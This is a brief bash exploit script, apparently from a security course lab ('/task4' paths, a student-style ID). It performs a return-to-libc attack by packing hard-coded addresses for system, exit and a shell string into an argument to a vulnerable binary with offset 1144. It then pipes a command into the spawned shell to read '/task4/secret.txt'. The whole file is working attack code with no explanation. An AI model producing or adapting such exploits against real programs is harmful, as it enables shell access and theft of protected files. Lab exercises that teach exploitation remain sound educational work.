#!/usr/bin/env bash
ADDR_SYS=$'\xd0\x4c\xdc\xf7'
ADDR_EX=$'\xf0\x71\xdb\xf7'
ADDR_SH=$'\xd5\x60\xf3\xf7'
subs=$(printf "%b" "${ADDR_SYS}${ADDR_EX}${ADDR_SH}")
echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \
  /task4/s2888144/vuln "$subs" 1144
